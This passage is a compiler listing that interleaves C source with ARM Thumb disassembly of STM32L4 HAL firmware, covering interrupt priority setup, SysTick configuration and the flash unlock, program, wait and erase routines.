 8001582:	b580      	push	{r7, lr}
 8001584:	b086      	sub	sp, #24
 8001586:	af00      	add	r7, sp, #0
 8001588:	4603      	mov	r3, r0
 800158a:	60b9      	str	r1, [r7, #8]
 800158c:	607a      	str	r2, [r7, #4]
 800158e:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 8001590:	2300      	movs	r3, #0
 8001592:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 8001594:	f7ff ff3e 	bl	8001414 <__NVIC_GetPriorityGrouping>
 8001598:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 800159a:	687a      	ldr	r2, [r7, #4]
 800159c:	68b9      	ldr	r1, [r7, #8]
 800159e:	6978      	ldr	r0, [r7, #20]
 80015a0:	f7ff ff8e 	bl	80014c0 <NVIC_EncodePriority>
 80015a4:	4602      	mov	r2, r0
 80015a6:	f997 300f 	ldrsb.w	r3, [r7, #15]
 80015aa:	4611      	mov	r1, r2
 80015ac:	4618      	mov	r0, r3
 80015ae:	f7ff ff5d 	bl	800146c <__NVIC_SetPriority>
}
 80015b2:	bf00      	nop
 80015b4:	3718      	adds	r7, #24
 80015b6:	46bd      	mov	sp, r7
 80015b8:	bd80      	pop	{r7, pc}

080015ba <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80015ba:	b580      	push	{r7, lr}
 80015bc:	b082      	sub	sp, #8
 80015be:	af00      	add	r7, sp, #0
 80015c0:	4603      	mov	r3, r0
 80015c2:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 80015c4:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80015c8:	4618      	mov	r0, r3
 80015ca:	f7ff ff31 	bl	8001430 <__NVIC_EnableIRQ>
}
 80015ce:	bf00      	nop
 80015d0:	3708      	adds	r7, #8
 80015d2:	46bd      	mov	sp, r7
 80015d4:	bd80      	pop	{r7, pc}

080015d6 <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 80015d6:	b580      	push	{r7, lr}
 80015d8:	b082      	sub	sp, #8
 80015da:	af00      	add	r7, sp, #0
 80015dc:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 80015de:	6878      	ldr	r0, [r7, #4]
 80015e0:	f7ff ffa2 	bl	8001528 <SysTick_Config>
 80015e4:	4603      	mov	r3, r0
}
 80015e6:	4618      	mov	r0, r3
 80015e8:	3708      	adds	r7, #8
 80015ea:	46bd      	mov	sp, r7
 80015ec:	bd80      	pop	{r7, pc}
	...

080015f0 <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 80015f0:	b580      	push	{r7, lr}
 80015f2:	b086      	sub	sp, #24
 80015f4:	af00      	add	r7, sp, #0
 80015f6:	60f8      	str	r0, [r7, #12]
 80015f8:	60b9      	str	r1, [r7, #8]
 80015fa:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 80015fe:	2300      	movs	r3, #0
 8001600:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 8001602:	4b2f      	ldr	r3, [pc, #188]	; (80016c0 <HAL_FLASH_Program+0xd0>)
 8001604:	781b      	ldrb	r3, [r3, #0]
 8001606:	2b01      	cmp	r3, #1
 8001608:	d101      	bne.n	800160e <HAL_FLASH_Program+0x1e>
 800160a:	2302      	movs	r3, #2
 800160c:	e053      	b.n	80016b6 <HAL_FLASH_Program+0xc6>
 800160e:	4b2c      	ldr	r3, [pc, #176]	; (80016c0 <HAL_FLASH_Program+0xd0>)
 8001610:	2201      	movs	r2, #1
 8001612:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001614:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001618:	f000 f888 	bl	800172c <FLASH_WaitForLastOperation>
 800161c:	4603      	mov	r3, r0
 800161e:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 8001620:	7dfb      	ldrb	r3, [r7, #23]
 8001622:	2b00      	cmp	r3, #0
 8001624:	d143      	bne.n	80016ae <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 8001626:	4b26      	ldr	r3, [pc, #152]	; (80016c0 <HAL_FLASH_Program+0xd0>)
 8001628:	2200      	movs	r2, #0
 800162a:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 800162c:	4b25      	ldr	r3, [pc, #148]	; (80016c4 <HAL_FLASH_Program+0xd4>)
 800162e:	681b      	ldr	r3, [r3, #0]
 8001630:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001634:	2b00      	cmp	r3, #0
 8001636:	d009      	beq.n	800164c <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001638:	4b22      	ldr	r3, [pc, #136]	; (80016c4 <HAL_FLASH_Program+0xd4>)
 800163a:	681b      	ldr	r3, [r3, #0]
 800163c:	4a21      	ldr	r2, [pc, #132]	; (80016c4 <HAL_FLASH_Program+0xd4>)
 800163e:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001642:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001644:	4b1e      	ldr	r3, [pc, #120]	; (80016c0 <HAL_FLASH_Program+0xd0>)
 8001646:	2202      	movs	r2, #2
 8001648:	771a      	strb	r2, [r3, #28]
 800164a:	e002      	b.n	8001652 <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 800164c:	4b1c      	ldr	r3, [pc, #112]	; (80016c0 <HAL_FLASH_Program+0xd0>)
 800164e:	2200      	movs	r2, #0
 8001650:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 8001652:	68fb      	ldr	r3, [r7, #12]
 8001654:	2b00      	cmp	r3, #0
 8001656:	d107      	bne.n	8001668 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 8001658:	e9d7 2300 	ldrd	r2, r3, [r7]
 800165c:	68b8      	ldr	r0, [r7, #8]
 800165e:	f000 f8bd 	bl	80017dc <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 8001662:	2301      	movs	r3, #1
 8001664:	613b      	str	r3, [r7, #16]
 8001666:	e010      	b.n	800168a <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 8001668:	68fb      	ldr	r3, [r7, #12]
 800166a:	2b01      	cmp	r3, #1
 800166c:	d002      	beq.n	8001674 <HAL_FLASH_Program+0x84>
 800166e:	68fb      	ldr	r3, [r7, #12]
 8001670:	2b02      	cmp	r3, #2
 8001672:	d10a      	bne.n	800168a <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 8001674:	683b      	ldr	r3, [r7, #0]
 8001676:	4619      	mov	r1, r3
 8001678:	68b8      	ldr	r0, [r7, #8]
 800167a:	f000 f8d5 	bl	8001828 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 800167e:	68fb      	ldr	r3, [r7, #12]
 8001680:	2b02      	cmp	r3, #2
 8001682:	d102      	bne.n	800168a <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 8001684:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 8001688:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800168a:	f24c 3050 	movw	r0, #50000	; 0xc350
 800168e:	f000 f84d 	bl	800172c <FLASH_WaitForLastOperation>
 8001692:	4603      	mov	r3, r0
 8001694:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 8001696:	693b      	ldr	r3, [r7, #16]
 8001698:	2b00      	cmp	r3, #0
 800169a:	d006      	beq.n	80016aa <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 800169c:	4b09      	ldr	r3, [pc, #36]	; (80016c4 <HAL_FLASH_Program+0xd4>)
 800169e:	695a      	ldr	r2, [r3, #20]
 80016a0:	693b      	ldr	r3, [r7, #16]
 80016a2:	43db      	mvns	r3, r3
 80016a4:	4907      	ldr	r1, [pc, #28]	; (80016c4 <HAL_FLASH_Program+0xd4>)
 80016a6:	4013      	ands	r3, r2
 80016a8:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80016aa:	f000 f9cf 	bl	8001a4c <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80016ae:	4b04      	ldr	r3, [pc, #16]	; (80016c0 <HAL_FLASH_Program+0xd0>)
 80016b0:	2200      	movs	r2, #0
 80016b2:	701a      	strb	r2, [r3, #0]

  return status;
 80016b4:	7dfb      	ldrb	r3, [r7, #23]
}
 80016b6:	4618      	mov	r0, r3
 80016b8:	3718      	adds	r7, #24
 80016ba:	46bd      	mov	sp, r7
 80016bc:	bd80      	pop	{r7, pc}
 80016be:	bf00      	nop
 80016c0:	2000000c 	.word	0x2000000c
 80016c4:	40022000 	.word	0x40022000

080016c8 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 80016c8:	b480      	push	{r7}
 80016ca:	b083      	sub	sp, #12
 80016cc:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 80016ce:	2300      	movs	r3, #0
 80016d0:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 80016d2:	4b0b      	ldr	r3, [pc, #44]	; (8001700 <HAL_FLASH_Unlock+0x38>)
 80016d4:	695b      	ldr	r3, [r3, #20]
 80016d6:	2b00      	cmp	r3, #0
 80016d8:	da0b      	bge.n	80016f2 <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 80016da:	4b09      	ldr	r3, [pc, #36]	; (8001700 <HAL_FLASH_Unlock+0x38>)
 80016dc:	4a09      	ldr	r2, [pc, #36]	; (8001704 <HAL_FLASH_Unlock+0x3c>)
 80016de:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 80016e0:	4b07      	ldr	r3, [pc, #28]	; (8001700 <HAL_FLASH_Unlock+0x38>)
 80016e2:	4a09      	ldr	r2, [pc, #36]	; (8001708 <HAL_FLASH_Unlock+0x40>)
 80016e4:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 80016e6:	4b06      	ldr	r3, [pc, #24]	; (8001700 <HAL_FLASH_Unlock+0x38>)
 80016e8:	695b      	ldr	r3, [r3, #20]
 80016ea:	2b00      	cmp	r3, #0
 80016ec:	da01      	bge.n	80016f2 <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 80016ee:	2301      	movs	r3, #1
 80016f0:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 80016f2:	79fb      	ldrb	r3, [r7, #7]
}
 80016f4:	4618      	mov	r0, r3
 80016f6:	370c      	adds	r7, #12
 80016f8:	46bd      	mov	sp, r7
 80016fa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80016fe:	4770      	bx	lr
 8001700:	40022000 	.word	0x40022000
 8001704:	45670123 	.word	0x45670123
 8001708:	cdef89ab 	.word	0xcdef89ab

0800170c <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 800170c:	b480      	push	{r7}
 800170e:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 8001710:	4b05      	ldr	r3, [pc, #20]	; (8001728 <HAL_FLASH_Lock+0x1c>)
 8001712:	695b      	ldr	r3, [r3, #20]
 8001714:	4a04      	ldr	r2, [pc, #16]	; (8001728 <HAL_FLASH_Lock+0x1c>)
 8001716:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 800171a:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 800171c:	2300      	movs	r3, #0
}
 800171e:	4618      	mov	r0, r3
 8001720:	46bd      	mov	sp, r7
 8001722:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001726:	4770      	bx	lr
 8001728:	40022000 	.word	0x40022000

0800172c <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 800172c:	b580      	push	{r7, lr}
 800172e:	b084      	sub	sp, #16
 8001730:	af00      	add	r7, sp, #0
 8001732:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 8001734:	f7ff fe1a 	bl	800136c <HAL_GetTick>
 8001738:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 800173a:	e00d      	b.n	8001758 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 800173c:	687b      	ldr	r3, [r7, #4]
 800173e:	f1b3 3fff 	cmp.w	r3, #4294967295
 8001742:	d009      	beq.n	8001758 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 8001744:	f7ff fe12 	bl	800136c <HAL_GetTick>
 8001748:	4602      	mov	r2, r0
 800174a:	68fb      	ldr	r3, [r7, #12]
 800174c:	1ad3      	subs	r3, r2, r3
 800174e:	687a      	ldr	r2, [r7, #4]
 8001750:	429a      	cmp	r2, r3
 8001752:	d801      	bhi.n	8001758 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 8001754:	2303      	movs	r3, #3
 8001756:	e036      	b.n	80017c6 <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001758:	4b1d      	ldr	r3, [pc, #116]	; (80017d0 <FLASH_WaitForLastOperation+0xa4>)
 800175a:	691b      	ldr	r3, [r3, #16]
 800175c:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001760:	2b00      	cmp	r3, #0
 8001762:	d1eb      	bne.n	800173c <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 8001764:	4b1a      	ldr	r3, [pc, #104]	; (80017d0 <FLASH_WaitForLastOperation+0xa4>)
 8001766:	691a      	ldr	r2, [r3, #16]
 8001768:	4b1a      	ldr	r3, [pc, #104]	; (80017d4 <FLASH_WaitForLastOperation+0xa8>)
 800176a:	4013      	ands	r3, r2
 800176c:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 800176e:	68bb      	ldr	r3, [r7, #8]
 8001770:	2b00      	cmp	r3, #0
 8001772:	d01e      	beq.n	80017b2 <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 8001774:	4b18      	ldr	r3, [pc, #96]	; (80017d8 <FLASH_WaitForLastOperation+0xac>)
 8001776:	685a      	ldr	r2, [r3, #4]
 8001778:	68bb      	ldr	r3, [r7, #8]
 800177a:	4313      	orrs	r3, r2
 800177c:	4a16      	ldr	r2, [pc, #88]	; (80017d8 <FLASH_WaitForLastOperation+0xac>)
 800177e:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 8001780:	68bb      	ldr	r3, [r7, #8]
 8001782:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001786:	2b00      	cmp	r3, #0
 8001788:	d007      	beq.n	800179a <FLASH_WaitForLastOperation+0x6e>
 800178a:	4b11      	ldr	r3, [pc, #68]	; (80017d0 <FLASH_WaitForLastOperation+0xa4>)
 800178c:	699a      	ldr	r2, [r3, #24]
 800178e:	68bb      	ldr	r3, [r7, #8]
 8001790:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001794:	490e      	ldr	r1, [pc, #56]	; (80017d0 <FLASH_WaitForLastOperation+0xa4>)
 8001796:	4313      	orrs	r3, r2
 8001798:	618b      	str	r3, [r1, #24]
 800179a:	68bb      	ldr	r3, [r7, #8]
 800179c:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80017a0:	2b00      	cmp	r3, #0
 80017a2:	d004      	beq.n	80017ae <FLASH_WaitForLastOperation+0x82>
 80017a4:	4a0a      	ldr	r2, [pc, #40]	; (80017d0 <FLASH_WaitForLastOperation+0xa4>)
 80017a6:	68bb      	ldr	r3, [r7, #8]
 80017a8:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80017ac:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 80017ae:	2301      	movs	r3, #1
 80017b0:	e009      	b.n	80017c6 <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 80017b2:	4b07      	ldr	r3, [pc, #28]	; (80017d0 <FLASH_WaitForLastOperation+0xa4>)
 80017b4:	691b      	ldr	r3, [r3, #16]
 80017b6:	f003 0301 	and.w	r3, r3, #1
 80017ba:	2b00      	cmp	r3, #0
 80017bc:	d002      	beq.n	80017c4 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 80017be:	4b04      	ldr	r3, [pc, #16]	; (80017d0 <FLASH_WaitForLastOperation+0xa4>)
 80017c0:	2201      	movs	r2, #1
 80017c2:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 80017c4:	2300      	movs	r3, #0
}
 80017c6:	4618      	mov	r0, r3
 80017c8:	3710      	adds	r7, #16
 80017ca:	46bd      	mov	sp, r7
 80017cc:	bd80      	pop	{r7, pc}
 80017ce:	bf00      	nop
 80017d0:	40022000 	.word	0x40022000
 80017d4:	0002c3fa 	.word	0x0002c3fa
 80017d8:	2000000c 	.word	0x2000000c

080017dc <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 80017dc:	b480      	push	{r7}
 80017de:	b085      	sub	sp, #20
 80017e0:	af00      	add	r7, sp, #0
 80017e2:	60f8      	str	r0, [r7, #12]
 80017e4:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 80017e8:	4b0e      	ldr	r3, [pc, #56]	; (8001824 <FLASH_Program_DoubleWord+0x48>)
 80017ea:	695b      	ldr	r3, [r3, #20]
 80017ec:	4a0d      	ldr	r2, [pc, #52]	; (8001824 <FLASH_Program_DoubleWord+0x48>)
 80017ee:	f043 0301 	orr.w	r3, r3, #1
 80017f2:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 80017f4:	68fb      	ldr	r3, [r7, #12]
 80017f6:	683a      	ldr	r2, [r7, #0]
 80017f8:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 80017fa:	f3bf 8f6f 	isb	sy
}
 80017fe:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 8001800:	e9d7 0100 	ldrd	r0, r1, [r7]
 8001804:	f04f 0200 	mov.w	r2, #0
 8001808:	f04f 0300 	mov.w	r3, #0
 800180c:	000a      	movs	r2, r1
 800180e:	2300      	movs	r3, #0
 8001810:	68f9      	ldr	r1, [r7, #12]
 8001812:	3104      	adds	r1, #4
 8001814:	4613      	mov	r3, r2
 8001816:	600b      	str	r3, [r1, #0]
}
 8001818:	bf00      	nop
 800181a:	3714      	adds	r7, #20
 800181c:	46bd      	mov	sp, r7
 800181e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001822:	4770      	bx	lr
 8001824:	40022000 	.word	0x40022000

08001828 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 8001828:	b480      	push	{r7}
 800182a:	b089      	sub	sp, #36	; 0x24
 800182c:	af00      	add	r7, sp, #0
 800182e:	6078      	str	r0, [r7, #4]
 8001830:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 8001832:	2340      	movs	r3, #64	; 0x40
 8001834:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 8001836:	687b      	ldr	r3, [r7, #4]
 8001838:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 800183a:	683b      	ldr	r3, [r7, #0]
 800183c:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 800183e:	4b14      	ldr	r3, [pc, #80]	; (8001890 <FLASH_Program_Fast+0x68>)
 8001840:	695b      	ldr	r3, [r3, #20]
 8001842:	4a13      	ldr	r2, [pc, #76]	; (8001890 <FLASH_Program_Fast+0x68>)
 8001844:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8001848:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 800184a:	f3ef 8310 	mrs	r3, PRIMASK
 800184e:	60fb      	str	r3, [r7, #12]
  return(result);
 8001850:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 8001852:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 8001854:	b672      	cpsid	i
}
 8001856:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 8001858:	697b      	ldr	r3, [r7, #20]
 800185a:	681a      	ldr	r2, [r3, #0]
 800185c:	69bb      	ldr	r3, [r7, #24]
 800185e:	601a      	str	r2, [r3, #0]
    dest_addr++;
 8001860:	69bb      	ldr	r3, [r7, #24]
 8001862:	3304      	adds	r3, #4
 8001864:	61bb      	str	r3, [r7, #24]
    src_addr++;
 8001866:	697b      	ldr	r3, [r7, #20]
 8001868:	3304      	adds	r3, #4
 800186a:	617b      	str	r3, [r7, #20]
    row_index--;
 800186c:	7ffb      	ldrb	r3, [r7, #31]
 800186e:	3b01      	subs	r3, #1
 8001870:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 8001872:	7ffb      	ldrb	r3, [r7, #31]
 8001874:	2b00      	cmp	r3, #0
 8001876:	d1ef      	bne.n	8001858 <FLASH_Program_Fast+0x30>
 8001878:	693b      	ldr	r3, [r7, #16]
 800187a:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 800187c:	68bb      	ldr	r3, [r7, #8]
 800187e:	f383 8810 	msr	PRIMASK, r3
}
 8001882:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 8001884:	bf00      	nop
 8001886:	3724      	adds	r7, #36	; 0x24
 8001888:	46bd      	mov	sp, r7
 800188a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800188e:	4770      	bx	lr
 8001890:	40022000 	.word	0x40022000

08001894 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 8001894:	b580      	push	{r7, lr}
 8001896:	b084      	sub	sp, #16
 8001898:	af00      	add	r7, sp, #0
 800189a:	6078      	str	r0, [r7, #4]
 800189c:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800189e:	4b48      	ldr	r3, [pc, #288]	; (80019c0 <HAL_FLASHEx_Erase+0x12c>)
 80018a0:	781b      	ldrb	r3, [r3, #0]
 80018a2:	2b01      	cmp	r3, #1
 80018a4:	d101      	bne.n	80018aa <HAL_FLASHEx_Erase+0x16>
 80018a6:	2302      	movs	r3, #2
 80018a8:	e085      	b.n	80019b6 <HAL_FLASHEx_Erase+0x122>
 80018aa:	4b45      	ldr	r3, [pc, #276]	; (80019c0 <HAL_FLASHEx_Erase+0x12c>)
 80018ac:	2201      	movs	r2, #1
 80018ae:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80018b0:	f24c 3050 	movw	r0, #50000	; 0xc350
 80018b4:	f7ff ff3a 	bl	800172c <FLASH_WaitForLastOperation>
 80018b8:	4603      	mov	r3, r0
 80018ba:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 80018bc:	7bfb      	ldrb	r3, [r7, #15]
 80018be:	2b00      	cmp	r3, #0
 80018c0:	d175      	bne.n	80019ae <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80018c2:	4b3f      	ldr	r3, [pc, #252]	; (80019c0 <HAL_FLASHEx_Erase+0x12c>)
 80018c4:	2200      	movs	r2, #0
 80018c6:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 80018c8:	4b3e      	ldr	r3, [pc, #248]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 80018ca:	681b      	ldr	r3, [r3, #0]
 80018cc:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80018d0:	2b00      	cmp	r3, #0
 80018d2:	d013      	beq.n	80018fc <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80018d4:	4b3b      	ldr	r3, [pc, #236]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 80018d6:	681b      	ldr	r3, [r3, #0]
 80018d8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80018dc:	2b00      	cmp	r3, #0
 80018de:	d009      	beq.n	80018f4 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 80018e0:	4b38      	ldr	r3, [pc, #224]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 80018e2:	681b      	ldr	r3, [r3, #0]
 80018e4:	4a37      	ldr	r2, [pc, #220]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 80018e6:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80018ea:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
